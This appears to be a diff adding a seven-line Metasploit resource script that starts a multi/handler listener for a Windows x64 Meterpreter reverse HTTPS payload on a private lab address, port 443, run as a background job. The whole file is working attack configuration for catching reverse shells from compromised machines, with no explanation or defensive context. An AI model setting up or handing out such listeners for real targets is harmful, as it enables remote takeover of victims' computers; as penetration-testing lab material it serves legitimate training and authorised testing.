@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.56.101
+set LPORT 443
+set exitfunc thread
+set stagerencode true
+run -j
